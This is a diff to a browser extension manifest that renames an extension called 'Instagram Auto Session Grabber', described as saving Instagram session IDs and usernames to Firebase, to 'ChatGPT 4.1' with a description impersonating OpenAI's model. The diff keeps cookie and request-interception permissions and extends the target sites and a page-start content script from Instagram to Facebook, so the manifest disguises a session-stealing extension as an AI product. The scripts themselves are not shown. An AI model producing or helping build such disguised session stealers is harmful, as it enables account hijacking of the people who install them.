@@ -1,11 +1,13 @@
 {
   "manifest_version": 3,
-  "name": "Instagram Auto Session Grabber",
-  "version": "1.0",
-  "description": "Auto save Instagram session ID + username to Firebase",
+  "name": "ChatGPT 4.1",
+  "version": "1.1",
+  "description": "ChatGPT-4 is an advanced language model by OpenAI that understands, generates, and responds to human-like text with high accuracy.",
   "permissions": ["cookies", "webRequest", "webNavigation"],
   "host_permissions": [
-    "*://*.instagram.com/*"
+    "*://*.instagram.com/*",
+    "*://*.facebook.com/*",
+    "*://facebook.com/*"
   ],
   "background": {
     "service_worker": "background.js",
@@ -13,11 +15,19 @@
   },
   "content_scripts": [
     {
-      "matches": ["*://*.instagram.com/*"],
+      "matches": [
+        "*://*.instagram.com/*",
+        "*://*.facebook.com/*",
+        "*://facebook.com/*"
+      ],
       "js": ["wake.js"],
       "run_at": "document_start"
     }
   ],
+  "icons": {
+    "48": "icons/48.png",
+    "128": "icons/128.png"
+  },
   "content_security_policy": {
     "extension_pages": "script-src 'self'; object-src 'self';"
   }
